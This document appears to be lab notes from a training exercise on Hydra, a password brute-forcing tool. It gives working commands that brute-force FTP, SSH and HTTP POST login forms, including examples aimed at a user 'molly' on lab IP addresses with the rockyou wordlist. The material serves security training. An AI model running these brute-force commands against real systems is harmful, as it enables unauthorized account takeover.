Hydra
# What is Hydra?
Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

Hydra can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

According to its official repository(https://github.com/vanhauser-thc/thc-hydra~),~ Hydra supports, i.e., has the ability to brute force the following protocols: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”

For more information on the options of each protocol in Hydra, you can check the Kali Hydra tool page(https://en.kali.tools/?p=220)

# Using Hydra
The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being ```user``` and a password list being ```passlist.txt```, we’d use the following command:
```sh
hydra -l user -P passlist.txt ftp://MACHINE_IP
```
![image](https://user-images.githubusercontent.com/2403660/236682586-8618da01-4e00-48e0-a6ad-5ae084b97e48.png)

For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

## SSH
```sh
hydra -l <username> -P <full path to pass> 10.10.18.163 -t 4 ssh
```

For example, ```hydra -l root -P passwords.txt 10.10.18.163 -t 4 ssh``` will run with the following arguments:

- Hydra will use ```root``` as the username for ssh
- It will try the passwords in the ```passwords.txt``` file
- There will be four threads running in parallel as indicated by -t 4

## Post Web Form
We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

```sh
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```
![image](https://user-images.githubusercontent.com/2403660/236682640-1642929a-6a16-419e-91bb-3769f8beb137.png)

Below is a more concrete example Hydra command to brute force a POST login form:
```sh
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- The login page is only ```/```, i.e., the main IP address.
The ```username``` is the form field where the username is entered
The specified username(s) will replace ```^USER^```
The ```password``` is the form field where the password is entered
The provided passwords will be replacing ```^PASS^```
Finally, ```F=incorrect``` is a string that appears in the server reply when the login fails.

```sh
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.83.139 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

```sh
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.83.139 -t 4 ssh
```

